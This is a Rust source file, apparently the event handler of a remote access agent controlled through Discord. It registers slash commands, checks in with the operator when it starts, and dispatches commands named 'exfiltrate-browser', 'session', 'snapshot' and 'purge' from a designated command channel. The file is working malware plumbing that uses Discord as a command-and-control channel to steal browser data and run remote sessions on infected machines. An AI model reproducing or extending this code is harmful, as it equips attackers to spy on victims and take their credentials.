use crate::{
    commands::{handle_command, info},
    commands::exfiltrate::handle_exfiltrate,
    commands::sessions::exit,
    commands::sessions::session::session_handler,
    commands::snapshot::snapshot_handler,
    commands::purge::purge_handler,
    register_commands,
    send_agent_check_in,
    utils::agent::get_or_create_agent,
};

use serenity::{
    async_trait,
    client::{Context, EventHandler},
    model::{
        application::{
            interaction::application_command::ApplicationCommandInteraction,
            interaction::{Interaction, InteractionResponseType},
        },
        channel::Message,
        gateway::Ready,
    },
};
use anyhow::Error;

pub struct MainHandler;

#[async_trait]
impl EventHandler for MainHandler {

    // This really only handles session messages
    async fn message(&self, ctx: Context, msg: Message) {
        let agent = get_or_create_agent(&ctx).await;

        if let Some(channel) = agent.get_session_channel() {
            if msg.channel_id == *channel {
                handle_command(&ctx, &msg).await.expect("Failed to handle command");
            }
        }
    }

    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        register_commands(&ctx)
            .await
            .expect("Error registering commands");
        send_agent_check_in(&ctx)
            .await
            .unwrap_or_else(|e| eprintln!("Error sending message: {:?}", e));
    }

    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        if let Interaction::ApplicationCommand(command) = interaction {
            handle_command_interaction(&ctx, command).await;
        }
    }
}

async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
    let agent = get_or_create_agent(ctx).await;

    if command.channel_id == *agent.get_command_channel() {
        let content = match command.data.name.as_str() {
            "info" => info::run(&command.channel_id, agent),
            "purge" => {
                if let Err(why) = purge_handler(ctx, &command).await {
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            "exfiltrate-browser" => {
                if let Err(why) = handle_exfiltrate(ctx, &command).await {
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            "session" => {
                if let Err(why) = session_handler(ctx, &command).await {
                    println!("Error handling session: {:?}", why);
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            "snapshot" => {
                if let Err(why) = snapshot_handler(ctx, &command).await {
                    println!("Error handling snapshot: {:?}", why);
                    handle_error(ctx, &command, why.to_string()).await
                }
                return;
            }
            _ => "The command has not been implemented within the commands channel.".to_string(),
        };

        handle_error(ctx, &command, content).await;
    } else if command.channel_id == agent.get_session_channel().unwrap() {
        let content = match command.data.name.as_str() {
            "exit" => {
                exit::run(&ctx).await.expect("TODO: panic message");
                return;
            }
            _ => "That command is not supported for command sessions.".to_string(),
        };
        handle_error(ctx, &command, content).await;
    }
}

async fn handle_error(ctx: &Context, command: &ApplicationCommandInteraction, content: String) {
    if let Err(why) = command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| message.content(&content))
        })
        .await
    {
        println!("Cannot respond to slash command: {}", why);
    }
}

pub async fn ephemeral_interaction_create(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
    content: &str,
) -> Result<(), Error> {
    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| message.content(content).ephemeral(true))
        })
        .await?;
    Ok(())
}